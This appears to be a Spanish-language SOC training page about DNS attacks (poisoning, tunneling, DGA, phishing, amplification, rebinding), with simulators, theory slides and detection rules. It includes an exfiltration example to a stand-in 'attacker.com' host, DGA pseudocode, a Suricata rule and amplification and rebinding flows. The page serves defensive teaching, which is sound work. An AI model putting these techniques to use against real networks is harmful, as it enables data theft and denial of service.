@@ -1,0 +1,1072 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>DNS — Protocolos SOC</title>
+  <meta name="description" content="DNS: cómo funciona, ataques comunes (tunneling, DGA, poisoning) y cómo detectarlos en un SOC." />
+  <link rel="stylesheet" href="../styles.css" />
+  <link rel="stylesheet" href="../boton-dubstep.css" />
+  <link rel="icon" href="../favicon.svg" type="image/svg+xml" />
+  <style> :root { --proto-color: #00ff88; } </style>
+  <script>
+    (function(){
+      const t = localStorage.getItem('protocolos-soc-theme') || 'vision-ui';
+      document.documentElement.setAttribute('data-theme', t);
+    })();
+  </script>
+</head>
+<body class="page-wrapper">
+
+  <header class="site-header">
+    <div class="container">
+      <a href="../index.html" class="site-logo">
+        <span class="logo-icon">🛡️</span>
+        <span>Protocolos<span class="accent">SOC</span></span>
+      </a>
+      <nav class="header-nav">
+        <a href="https://github.com/xavimape/protocolos-red-soc" target="_blank" rel="noopener" data-i18n="nav.github">GitHub</a>
+      </nav>
+      <div class="ui-controls">
+        <a href="../index.html" class="back-to-hub"><span class="back-arrow">←</span> <span data-i18n="nav.back">Inicio</span></a>
+        <select class="theme-select" id="theme-select" title="Cambiar tema"></select>
+        <button class="ctrl-btn" id="lang-toggle" title="Switch to English" onclick="i18n.toggleLang()">EN</button>
+      </div>
+    </div>
+  </header>
+
+  <div class="module-header">
+    <div class="container">
+      <div class="module-breadcrumb">
+        <a href="../index.html">Hub</a>
+        <span class="sep">›</span>
+        <span>DNS</span>
+      </div>
+      <div class="module-title-row">
+        <div class="module-number-badge">1</div>
+        <div>
+          <div class="module-title">DNS</div>
+          <div class="module-subtitle" data-i18n="dns.subtitle">Sistema de Nombres de Dominio · UDP/53 · Capa de Aplicación</div>
+        </div>
+      </div>
+      <nav class="tabs-nav">
+        <button class="tab-btn active" data-tab="demo" onclick="SOC.switchTab('dns','demo')" data-i18n="tab.demo">🧪 Demo Lab</button>
+        <button class="tab-btn" data-tab="teoria" onclick="SOC.switchTab('dns','teoria')" data-i18n="tab.teoria">📖 Teoría</button>
+        <button class="tab-btn" data-tab="ejercicios" onclick="SOC.switchTab('dns','ejercicios')" data-i18n="tab.ejercicios">✏️ Ejercicios</button>
+        <button class="tab-btn" data-tab="recursos" onclick="SOC.switchTab('dns','recursos')" data-i18n="tab.recursos">📚 Recursos</button>
+      </nav>
+    </div>
+  </div>
+
+  <main class="container">
+
+    <!-- ── Tab: Demo Lab ── -->
+    <div class="tab-content active" data-tab="demo">
+      <div class="demo-container">
+        <div class="demo-panel">
+          <div class="demo-panel-header">
+            <div class="dot-row"><div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div></div>
+            <span class="panel-title" data-i18n="dns.demo.title">Simulador DNS</span>
+            <span class="badge badge-success">UDP/53</span>
+          </div>
+          <div class="demo-panel-body">
+            <div class="demo-input-group">
+              <label data-i18n="dns.demo.label.domain">Dominio a resolver:</label>
+              <input type="text" id="dns-domain" value="example.com" placeholder="ej: example.com" />
+            </div>
+            <div class="demo-input-group">
+              <label data-i18n="dns.demo.label.type">Tipo de consulta:</label>
+              <select id="dns-type">
+                <option value="A" data-i18n="dns.demo.opt.a">A — Dirección IPv4</option>
+                <option value="AAAA" data-i18n="dns.demo.opt.aaaa">AAAA — Dirección IPv6</option>
+                <option value="MX" data-i18n="dns.demo.opt.mx">MX — Servidor de correo</option>
+                <option value="TXT" data-i18n="dns.demo.opt.txt">TXT — Texto arbitrario</option>
+                <option value="CNAME" data-i18n="dns.demo.opt.cname">CNAME — Alias</option>
+              </select>
+            </div>
+            <div class="step-indicator" id="dns-steps">
+              <div class="step-dot" title="Cliente"></div>
+              <div class="step-dot" title="Resolver"></div>
+              <div class="step-dot" title="Root"></div>
+              <div class="step-dot" title="TLD"></div>
+              <div class="step-dot" title="Autoritativo"></div>
+            </div>
+            <div class="btn-row">
+              <button class="btn btn-primary" onclick="dnsDemo.runQuery()" data-i18n="dns.demo.btn.run">▶ Resolver</button>
+              <button class="btn btn-secondary" onclick="dnsDemo.reset()" data-i18n="btn.reset">↺ Reset</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="demo-panel">
+          <div class="demo-panel-header">
+            <div class="dot-row"><div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div></div>
+            <span class="panel-title" data-i18n="dns.demo.response.title">Respuesta DNS</span>
+          </div>
+          <div class="demo-panel-body">
+            <div class="demo-output" id="dns-output">
+              <div class="log-line">
+                <span class="log-time">[→]</span>
+                <span class="log-info" data-i18n="dns.demo.waiting">Esperando consulta DNS...</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Segunda demo: DNS Cache Poisoning -->
+      <div class="mt-3">
+        <div class="section-title" data-i18n="dns.demo.poison.title">⚠️ Demo: DNS Cache Poisoning</div>
+        <p class="text-secondary mb-2" style="font-size:0.88rem;" data-i18n="dns.demo.poison.desc">
+          El atacante introduce un registro falso en la caché del resolver.
+        </p>
+        <div class="demo-container">
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="dns.demo.cache.before">🟢 Caché antes del ataque</span>
+            </div>
+            <div class="demo-panel-body">
+              <table class="data-table" id="cache-before">
+                <thead>
+                  <tr>
+                    <th data-i18n="dns.tbl.domain">Dominio</th>
+                    <th data-i18n="dns.tbl.type">Tipo</th>
+                    <th data-i18n="dns.tbl.ipval">IP / Valor</th>
+                    <th>TTL</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr><td>bank.com</td><td>A</td><td>93.184.216.34</td><td>300s</td></tr>
+                  <tr><td>example.com</td><td>A</td><td>93.184.216.34</td><td>3600s</td></tr>
+                  <tr><td>google.com</td><td>A</td><td>142.250.80.46</td><td>300s</td></tr>
+                </tbody>
+              </table>
+              <div class="btn-row">
+                <button class="btn btn-primary" onclick="dnsDemo.runPoisoning()" data-i18n="dns.demo.btn.poison">💉 Simular Ataque</button>
+                <button class="btn btn-secondary" onclick="dnsDemo.resetCache()" data-i18n="dns.demo.btn.resetcache">↺ Reset caché</button>
+              </div>
+            </div>
+          </div>
+
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="dns.demo.cache.after">🔴 Caché después del ataque</span>
+            </div>
+            <div class="demo-panel-body">
+              <table class="data-table" id="cache-after">
+                <thead>
+                  <tr>
+                    <th data-i18n="dns.tbl.domain">Dominio</th>
+                    <th data-i18n="dns.tbl.type">Tipo</th>
+                    <th data-i18n="dns.tbl.ipval">IP / Valor</th>
+                    <th>TTL</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr><td colspan="4" style="color:var(--text-muted);text-align:center;padding:1.5rem;" data-i18n="dns.demo.poison.waiting">Esperando ataque...</td></tr>
+                </tbody>
+              </table>
+              <div class="demo-output" id="poison-log" style="min-height:80px;margin-top:0.75rem;">
+                <div class="log-line"><span class="log-time">[→]</span><span class="log-info" data-i18n="ej.waiting">Esperando...</span></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div><!-- /mt-3 cache poisoning -->
+
+      <!-- Demo 3: DNS Tunneling -->
+      <div class="mt-3">
+        <div class="section-title" data-i18n="dns.demo.tunnel.title">🕳️ Demo: DNS Tunneling (Exfiltración)</div>
+        <p class="text-secondary mb-2" style="font-size:0.88rem;" data-i18n="dns.demo.tunnel.desc">
+          El atacante codifica datos en subdominios para exfiltrarlos sin levantar alertas de firewall.
+        </p>
+        <div class="demo-container">
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <div class="dot-row"><div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div></div>
+              <span class="panel-title" data-i18n="dns.demo.tunnel.panel.q">📤 Queries generadas</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-input-group">
+                <label data-i18n="dns.demo.tunnel.label">Mensaje a exfiltrar:</label>
+                <input type="text" id="tunnel-msg" value="passwd:root:x:0:0" placeholder="ej: datos secretos" maxlength="60" />
+              </div>
+              <div class="btn-row">
+                <button class="btn btn-primary" onclick="dnsDemo.runTunneling()" data-i18n="dns.demo.tunnel.btn">📡 Simular Tunelización</button>
+                <button class="btn btn-secondary" onclick="dnsDemo.resetTunnel()" data-i18n="btn.reset">↺ Reset</button>
+              </div>
+              <div class="demo-output" id="tunnel-queries" style="margin-top:0.75rem;min-height:120px;"></div>
+            </div>
+          </div>
+
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <div class="dot-row"><div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div></div>
+              <span class="panel-title" data-i18n="dns.demo.tunnel.panel.d">🔍 Análisis de detección</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-output" id="tunnel-detect" style="min-height:180px;"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Demo 4: DGA Detector -->
+      <div class="mt-3">
+        <div class="section-title" data-i18n="dns.demo.dga.title">🎲 Demo: DGA — Domain Generation Algorithm</div>
+        <p class="text-secondary mb-2" style="font-size:0.88rem;" data-i18n="dns.demo.dga.desc">
+          El malware genera dominios aleatorios para C2. Un analista SOC los identifica por su alta entropía.
+        </p>
+        <div class="demo-container">
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <div class="dot-row"><div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div></div>
+              <span class="panel-title" data-i18n="dns.demo.dga.panel.input">🎯 Entrada</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-input-group">
+                <label data-i18n="dns.demo.dga.label">Dominio a analizar:</label>
+                <input type="text" id="dga-domain" value="xkj3mq7vp.com" placeholder="ej: google.com" />
+              </div>
+              <div class="btn-row">
+                <button class="btn btn-primary" onclick="dnsDemo.runDGA()" data-i18n="dns.demo.dga.btn">🔬 Analizar dominio</button>
+                <button class="btn btn-secondary" onclick="dnsDemo.resetDGA()" data-i18n="btn.reset">↺ Reset</button>
+              </div>
+              <div style="margin-top:1rem;">
+                <p style="font-size:0.78rem;color:var(--text-muted);margin-bottom:0.4rem;" data-i18n="dns.demo.dga.examples">Ejemplos conocidos de DGA:</p>
+                <div style="display:flex;flex-wrap:wrap;gap:0.35rem;">
+                  <button class="btn btn-secondary" style="font-size:0.72rem;padding:0.2rem 0.6rem;" onclick="document.getElementById('dga-domain').value='xkj3mq7vp.com'">xkj3mq7vp.com</button>
+                  <button class="btn btn-secondary" style="font-size:0.72rem;padding:0.2rem 0.6rem;" onclick="document.getElementById('dga-domain').value='a7f3h2kl9qw.net'">a7f3h2kl9qw.net</button>
+                  <button class="btn btn-secondary" style="font-size:0.72rem;padding:0.2rem 0.6rem;" onclick="document.getElementById('dga-domain').value='google.com'">google.com</button>
+                  <button class="btn btn-secondary" style="font-size:0.72rem;padding:0.2rem 0.6rem;" onclick="document.getElementById('dga-domain').value='microsoft.com'">microsoft.com</button>
+                  <button class="btn btn-secondary" style="font-size:0.72rem;padding:0.2rem 0.6rem;" onclick="document.getElementById('dga-domain').value='qzwxmvbpnr.ru'">qzwxmvbpnr.ru</button>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <div class="dot-row"><div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div></div>
+              <span class="panel-title" data-i18n="dns.demo.dga.panel.result">📊 Análisis de entropía</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-output" id="dga-result" style="min-height:220px;"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Demo 5: DNS Phishing -->
+      <div class="mt-3">
+        <div class="section-title" data-i18n="dns.demo.phishing.title">🎣 Demo: DNS Phishing — Dominios engañosos</div>
+        <p class="text-secondary mb-2" style="font-size:0.88rem;" data-i18n="dns.demo.phishing.desc">
+          Los atacantes registran dominios visualmente similares al legítimo (typosquatting, homoglyph, subdomain abuse) para robar credenciales. DNS no autentica — cualquiera puede registrar paypa1.com.
+        </p>
+        <div class="demo-container">
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="dns.demo.phishing.panel">Analizar dominio sospechoso</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-input-group">
+                <label data-i18n="dns.demo.phishing.domain">Dominio a analizar:</label>
+                <input type="text" id="phishing-domain" value="paypa1.com" />
+              </div>
+              <div class="demo-input-group">
+                <label data-i18n="dns.demo.phishing.technique">Técnica:</label>
+                <select id="phishing-technique">
+                  <option value="typo" selected>Typosquatting (paypa1.com)</option>
+                  <option value="homoglyph" data-i18n="dns.opt1">Homoglyph (pаypal.com — 'а' cirílica)</option>
+                  <option value="subdomain">Subdomain abuse (paypal.com.evil.io)</option>
+                  <option value="combo">Combo (secure-paypal-login.com)</option>
+                </select>
+              </div>
+              <div class="btn-row">
+                <button class="btn btn-primary" onclick="dnsDemo.runPhishing()" data-i18n="dns.demo.phishing.btn">🔍 Analizar dominio</button>
+                <button class="btn btn-secondary" onclick="dnsDemo.resetPhishing()" data-i18n="btn.reset">↺ Reset</button>
+              </div>
+            </div>
+          </div>
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="dns.demo.phishing.result">Análisis de dominio</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-output" id="phishing-output" style="min-height:200px;"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+
+      <!-- Demo 6: DNS Amplification DDoS -->
+      <div class="mt-3">
+        <div class="section-title" data-i18n="dns.demo.amp.title">💥 Demo: DNS Amplification DDoS</div>
+        <p class="text-secondary mb-2" style="font-size:0.88rem;" data-i18n="dns.demo.amp.desc">
+          El atacante envía consultas DNS con IP origen falsificada (víctima). El resolver responde a la víctima con respuestas mucho más grandes — factor de amplificación ×50-100x.
+        </p>
+        <div class="demo-container">
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="dns.demo.amp.panel">Configurar amplificación</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-input-group">
+                <label data-i18n="dns.demo.amp.victim">IP víctima (spoofed src):</label>
+                <input type="text" id="amp-victim" value="203.0.113.10" />
+              </div>
+              <div class="demo-input-group">
+                <label data-i18n="dns.demo.amp.resolvers">Resolvers abiertos:</label>
+                <select id="amp-resolvers">
+                  <option value="100">~100 resolvers</option>
+                  <option value="1000" selected>~1.000 resolvers</option>
+                  <option value="10000">~10.000 resolvers</option>
+                </select>
+              </div>
+              <div class="demo-input-group">
+                <label data-i18n="dns.demo.amp.qtype">Tipo de query (amplificación):</label>
+                <select id="amp-qtype">
+                  <option value="ANY" selected data-i18n="dns.opt2">ANY (mayor amplificación)</option>
+                  <option value="TXT">TXT record</option>
+                  <option value="RRSIG">RRSIG (DNSSEC)</option>
+                </select>
+              </div>
+              <div class="btn-row">
+                <button class="btn btn-primary" onclick="dnsDemo.runAmplification()" data-i18n="dns.demo.amp.btn">▶ Simular amplificación</button>
+                <button class="btn btn-secondary" onclick="dnsDemo.resetAmp()" data-i18n="btn.reset">↺ Reset</button>
+              </div>
+            </div>
+          </div>
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="dns.demo.amp.result">Flujo del ataque</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-output" id="amp-output" style="min-height:200px;"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Demo 7: DNS Rebinding -->
+      <div class="mt-3">
+        <div class="section-title" data-i18n="dns.demo.rebind.title">🔁 Demo: DNS Rebinding</div>
+        <p class="text-secondary mb-2" style="font-size:0.88rem;" data-i18n="dns.demo.rebind.desc">
+          El atacante controla un dominio que primero resuelve a IP pública, luego a IP interna. El navegador de la víctima, confiando en el dominio, hace peticiones a servicios internos.
+        </p>
+        <div class="demo-container">
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="dns.demo.rebind.panel">Configurar rebinding</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-input-group">
+                <label data-i18n="dns.demo.rebind.domain">Dominio atacante:</label>
+                <input type="text" id="rebind-domain" value="evil-rebind.com" />
+              </div>
+              <div class="demo-input-group">
+                <label data-i18n="dns.demo.rebind.target">Objetivo interno:</label>
+                <select id="rebind-target">
+                  <option value="router">Router 192.168.1.1 (admin panel)</option>
+                  <option value="api" selected data-i18n="dns.opt3">API interna 10.0.0.5:8080</option>
+                  <option value="metadata">AWS Metadata 169.254.169.254</option>
+                </select>
+              </div>
+              <div class="btn-row">
+                <button class="btn btn-primary" onclick="dnsDemo.runRebinding()" data-i18n="dns.demo.rebind.btn">▶ Simular rebinding</button>
+                <button class="btn btn-secondary" onclick="dnsDemo.resetRebind()" data-i18n="btn.reset">↺ Reset</button>
+              </div>
+            </div>
+          </div>
+          <div class="demo-panel">
+            <div class="demo-panel-header">
+              <span class="panel-title" data-i18n="dns.demo.rebind.result">Flujo del ataque</span>
+            </div>
+            <div class="demo-panel-body">
+              <div class="demo-output" id="rebind-output" style="min-height:200px;"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div><!-- /tab demo -->
+
+    <!-- ── Tab: Teoría ── -->
+    <div class="tab-content" data-tab="teoria">
+      <div class="slides-container" id="dns-slides">
+
+        <div class="slide active">
+          <span class="slide-number">1 / 11</span>
+          <h2 data-i18n="dns.s1.title">¿Qué es DNS?</h2>
+          <p class="slide-subtitle" data-i18n="dns.s1.sub">El directorio telefónico de Internet</p>
+          <p data-i18n="dns.s1.p1">DNS (Domain Name System) traduce nombres de dominio legibles por humanos —como <code>google.com</code>— a direcciones IP que los routers pueden enrutar. Sin DNS, tendríamos que memorizar IPs para cada servicio.</p>
+          <div class="callout" data-i18n="dns.s1.callout">
+            <strong>Puerto y protocolo:</strong> UDP/53 para consultas (≤512 bytes). TCP/53 para respuestas grandes o transferencias de zona (AXFR).
+          </div>
+          <p data-i18n="dns.s1.p2">DNS opera de forma jerárquica y distribuida: no hay un único servidor que sepa todo, sino una cadena de servidores que colaboran para resolver cada nombre.</p>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">2 / 11</span>
+          <h2 data-i18n="dns.s2.title">Cómo funciona: el flujo de resolución</h2>
+          <p class="slide-subtitle" data-i18n="dns.s2.sub">5 pasos desde la pregunta hasta la respuesta</p>
+          <div class="flow-diagram" data-i18n="dns.s2.flow">
+Cliente (browser)
+    ↓  "¿Cuál es la IP de example.com?"
+Resolver recursivo (DNS del ISP o 8.8.8.8)
+    ↓  Si no tiene en caché → pregunta al Root
+Root Server (.)
+    ↓  "Pregunta al servidor TLD de .com"
+TLD Server (.com)
+    ↓  "Pregunta al servidor autoritativo"
+Servidor Autoritativo (example.com)
+    ↓  "La IP es 93.184.216.34, TTL 3600s"
+Resolver → guarda en caché → responde al cliente
+          </div>
+          <div class="callout" data-i18n="dns.s2.callout">
+            <strong>TTL (Time To Live):</strong> cuántos segundos puede el resolver guardar la respuesta en caché antes de volver a preguntar. Un TTL bajo = más tráfico DNS.
+          </div>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">3 / 11</span>
+          <h2 data-i18n="dns.s3.title">Tipos de registros DNS</h2>
+          <p class="slide-subtitle" data-i18n="dns.s3.sub">Los más relevantes para un SOC</p>
+          <ul>
+            <li data-i18n="dns.s3.li1"><code>A</code> — Nombre → IPv4 (el más común)</li>
+            <li data-i18n="dns.s3.li2"><code>AAAA</code> — Nombre → IPv6</li>
+            <li data-i18n="dns.s3.li3"><code>CNAME</code> — Alias → otro nombre</li>
+            <li data-i18n="dns.s3.li4"><code>MX</code> — Servidor de correo</li>
+            <li data-i18n="dns.s3.li5"><code>TXT</code> — Texto arbitrario (SPF, DKIM, verificación)</li>
+            <li data-i18n="dns.s3.li6"><code>PTR</code> — IP → Nombre (DNS inverso, útil en forensia)</li>
+            <li data-i18n="dns.s3.li7"><code>NS</code> — Servidor autoritativo de la zona</li>
+            <li data-i18n="dns.s3.li8"><code>SOA</code> — Start of Authority (metadatos de la zona)</li>
+          </ul>
+          <div class="callout warning" data-i18n="dns.s3.callout">
+            <strong>Relevancia SOC:</strong> los registros TXT y consultas excesivas a subdominios son señales comunes de DNS Tunneling y C2 sobre DNS.
+          </div>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">4 / 11</span>
+          <h2 data-i18n="dns.s4.title">Ataque 1: DNS Spoofing / Cache Poisoning</h2>
+          <p class="slide-subtitle" data-i18n="dns.s4.sub">El atacante falsifica la respuesta del resolver</p>
+          <p data-i18n="dns.s4.p1">El atacante envía una respuesta DNS falsa al resolver antes de que llegue la legítima, insertando su IP en la caché. Todas las consultas futuras a ese dominio se redirigen al atacante.</p>
+          <div class="callout danger" data-i18n="dns.s4.callout">
+            <strong>Mecanismo:</strong> Kaminsky Attack (2008) — el atacante inunda el resolver con respuestas falsas para diferentes subdominios hasta que una coincide con el ID de transacción correcto.
+          </div>
+          <p data-i18n="dns.s4.detect"><strong>Cómo detectarlo en SOC:</strong></p>
+          <ul>
+            <li data-i18n="dns.s4.li1">Respuestas DNS con TTL anormalmente alto o bajo</li>
+            <li data-i18n="dns.s4.li2">IP de respuesta en rango no esperado para ese dominio</li>
+            <li data-i18n="dns.s4.li3">Múltiples respuestas para la misma consulta (race condition)</li>
+            <li data-i18n="dns.s4.li4">Logs de Zeek: <code>dns.log</code> con <code>rcode=0</code> pero IP inesperada</li>
+          </ul>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">5 / 11</span>
+          <h2 data-i18n="dns.s5.title">Ataque 2: DNS Tunneling</h2>
+          <p class="slide-subtitle" data-i18n="dns.s5.sub">Exfiltración de datos usando consultas DNS</p>
+          <p data-i18n="dns.s5.p1">El atacante codifica datos en subdominios de su dominio controlado. El malware en la víctima hace consultas DNS normales que pasan firewalls — pero llevan datos exfiltrados.</p>
+          <div class="flow-diagram" data-i18n="dns.s5.flow">
+Víctima → consulta: SGVsbG8gV29ybGQ.attacker.com
+DNS → respuesta legítima (IP del servidor C2)
+El servidor C2 decodifica "Hello World" del subdominio
+          </div>
+          <div class="callout danger" data-i18n="dns.s5.callout">
+            <strong>IOCs:</strong> subdominios de alta entropía (Base64/hex), longitud de consulta &gt;50 caracteres, volumen anormal de consultas TXT al mismo dominio base.
+          </div>
+          <p data-i18n="dns.s5.tools"><strong>Herramientas atacantes:</strong> dnscat2, iodine, dns2tcp.</p>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">6 / 11</span>
+          <h2 data-i18n="dns.s6.title">Ataque 3: DGA (Domain Generation Algorithm)</h2>
+          <p class="slide-subtitle" data-i18n="dns.s6.sub">El malware genera dominios pseudo-aleatorios para evitar bloqueos</p>
+          <p data-i18n="dns.s6.p1">El malware y el servidor C2 usan el mismo algoritmo (DGA) con una semilla compartida (fecha, etc.) para generar cientos de dominios. Solo uno de ellos estará activo — pero el defensor no sabe cuál.</p>
+          <div class="callout danger" data-i18n="dns.s6.callout">
+            <strong>Ejemplo DGA (pseudocódigo):</strong><br>
+            <code>seed = fecha_actual()</code><br>
+            <code>dominio = sha256(seed + contador)[:12] + ".com"</code><br>
+            → genera: <code>xk3mq7pzralc.com</code>, <code>9bv2nwtqfeld.com</code>...
+          </div>
+          <p data-i18n="dns.s6.detect"><strong>Detección:</strong> alta entropía del nombre de dominio, ausencia de historia de resolución, NXDomain masivo (el malware prueba todos los dominios DGA buscando el activo).</p>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">7 / 11</span>
+          <h2 data-i18n="dns.s7.title">Ataque 4: Dominios maliciosos y Phishing</h2>
+          <p class="slide-subtitle" data-i18n="dns.s7.sub">Typosquatting, homoglifo y dominios lookalike</p>
+          <p data-i18n="dns.s7.p1">El atacante registra dominios similares al legítimo para engañar a usuarios o herramientas de seguridad.</p>
+          <ul>
+            <li data-i18n="dns.s7.li1"><strong>Typosquatting:</strong> <code>goggle.com</code>, <code>facbook.com</code></li>
+            <li data-i18n="dns.s7.li2"><strong>Homoglifo:</strong> <code>gооgle.com</code> (la "o" es cirílica)</li>
+            <li data-i18n="dns.s7.li3"><strong>Lookalike:</strong> <code>paypa1.com</code>, <code>secure-bankofamerica-login.com</code></li>
+            <li data-i18n="dns.s7.li4"><strong>Fast Flux:</strong> el dominio C2 cambia su IP cada pocos segundos para evadir bloqueos por IP</li>
+          </ul>
+          <div class="callout warning" data-i18n="dns.s7.callout">
+            <strong>SOC:</strong> integrar feeds de threat intel (AlienVault, Cisco Umbrella) para detección en tiempo real. Zeek + reglas Suricata para lookalike domains.
+          </div>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">8 / 11</span>
+          <h2 data-i18n="dns.s8.title">Cómo se ve en telemetría SOC</h2>
+          <p class="slide-subtitle" data-i18n="dns.s8.sub">DNS en logs de Zeek, Suricata y SIEM</p>
+          <pre data-i18n="dns.pre0">
+# Zeek dns.log — consulta normal
+ts=1719300000 uid=C1234 id.orig_h=192.168.1.5 proto=udp
+query=example.com qtype_name=A rcode_name=NOERROR answers=93.184.216.34 TTL=3600
+
+# Zeek dns.log — posible DGA (subdominio de alta entropía)
+query=xk3mq7pzralc.com qtype_name=A rcode_name=NXDOMAIN
+
+# Suricata — alerta DNS Tunneling
+alert dns any any -> any 53 (
+  msg:"DNS Tunneling - High entropy subdomain";
+  dns.query; content:".attacker.com";
+  pcre:"/^[a-zA-Z0-9+\/]{20,}\.[^.]+\.[^.]+$/";
+  classtype:trojan-activity; sid:9000001; rev:1;)</pre>
+          <div class="callout" data-i18n="dns.s8.callout">
+            <strong>Campos clave Zeek dns.log:</strong> <code>query</code>, <code>qtype_name</code>, <code>rcode_name</code>, <code>answers</code>, <code>TTLs</code>, <code>rejected</code>.
+          </div>
+        </div>
+
+        <div class="slide">
+          <span class="slide-number">9 / 11</span>
+          <h2 data-i18n="dns.s9.title">Detección y mitigación</h2>
+          <p class="slide-subtitle" data-i18n="dns.s9.sub">Resumen operativo para SOC</p>
+          <ul>
+            <li data-i18n="dns.s9.li1">🔒 <strong>DNSSEC</strong> — firma criptográfica de registros DNS (previene spoofing)</li>
+            <li data-i18n="dns.s9.li2">📊 <strong>DNS Sinkholing</strong> — redirigir dominios maliciosos conocidos a un servidor controlado</li>
+            <li data-i18n="dns.s9.li3">📈 <strong>Análisis de entropía</strong> — alta entropía en subdominio = sospechoso</li>
+            <li data-i18n="dns.s9.li4">🔢 <strong>Volumen de NXDOMAIN</strong> — spikes = posible DGA o reconocimiento</li>
+            <li data-i18n="dns.s9.li5">⏱️ <strong>TTL anormalmente bajo</strong> — posible Fast Flux</li>
+            <li data-i18n="dns.s9.li6">📏 <strong>Longitud de consulta &gt;50 chars</strong> — posible tunneling</li>
+            <li data-i18n="dns.s9.li7">🌐 <strong>RPZ (Response Policy Zone)</strong> — bloquear dominios maliciosos en el resolver</li>
+          </ul>
+          <div class="callout" data-i18n="dns.s9.callout">
+            <strong>Regla Sigma básica — DGA Detection:</strong><br>
+            <code>selection: dns.query|re: '^[a-z0-9]{10,}\.com$'</code><br>
+            <code>condition: selection AND NOT dns.answers</code>
+          </div>
+        </div>
+
+
+        <div class="slide">
+          <span class="slide-number">10 / 11</span>
+          <h2 data-i18n="dns.s10.title">Ataque 7: DNS Amplification DDoS</h2>
+          <p class="slide-subtitle" data-i18n="dns.s10.sub">Usar resolvers DNS abiertos como amplificadores de tráfico</p>
+          <p data-i18n="dns.s10.p1">El atacante spoofea la IP origen (víctima) y envía consultas DNS a miles de resolvers abiertos. Cada resolver responde a la víctima con paquetes mucho más grandes. Factor típico: ×50-100x. Una consulta de 40 bytes genera respuestas de 4.000 bytes.</p>
+          <pre data-i18n="dns.pre1">
+FLUJO DEL ATAQUE:
+
+Atacante (IP: 1.2.3.4, spoofeando 203.0.113.10):
+  → Envía: DNS ANY isc.org?  [40 bytes, src=203.0.113.10]
+  → A: 10.000 resolvers DNS abiertos
+
+Cada resolver responde a la VICTIMA:
+  → 203.0.113.10 recibe: 4.096 bytes de respuesta
+  → ×10.000 resolvers = 40 GB/s sobre la víctima
+
+FACTOR DE AMPLIFICACIÓN POR TIPO DE QUERY:
+  ANY     → ×50-100x  (mayor, pero cada vez más bloqueado)
+  TXT     → ×20-40x   (registros SPF/DKIM largos)
+  RRSIG   → ×30-60x   (DNSSEC signatures)
+  MX      → ×10-20x
+
+DETECCIÓN:
+  Zeek dns.log: mismo query repetido miles de veces con src IPs distintas
+  NetFlow: volumen DNS saliente inusual desde resolver
+  Alerta: resolver respondiendo a IPs que no consultaron
+
+MITIGACIÓN:
+  Resolver: BCP38 — filtrar paquetes con src IP spoofed
+  ISP: uRPF (Unicast Reverse Path Forwarding)
+  Resolver: Response Rate Limiting (RRL) en BIND/Unbound
+  Deshabilitar consultas ANY en resolvers públicos</pre>
+          <p style="font-size:0.85rem;color:var(--text-secondary);">MITRE ATT&CK: <strong>T1498.002</strong> — Network DoS: Reflection Amplification</p>
+        </div>
+
+
+        <div class="slide">
+          <span class="slide-number">11 / 11</span>
+          <h2 data-i18n="dns.s11.title">Ataque 8: DNS Rebinding</h2>
+          <p class="slide-subtitle" data-i18n="dns.s11.sub">Bypass de Same-Origin Policy usando TTL corto</p>
+          <p data-i18n="dns.s11.p1">El atacante controla un dominio con TTL muy bajo. Primero resuelve a IP pública (para que el navegador cargue la página). Luego cambia la resolución a una IP interna. El navegador sigue confiando en el dominio y ejecuta peticiones al interior de la red.</p>
+          <pre data-i18n="dns.pre2">
+FLUJO DEL ATAQUE:
+
+FASE 1 — Víctima visita evil-rebind.com:
+  DNS query: evil-rebind.com → 1.2.3.4 (IP pública del atacante, TTL=1s)
+  Navegador carga página con JavaScript malicioso
+
+FASE 2 — TTL expira (1 segundo), DNS cambia:
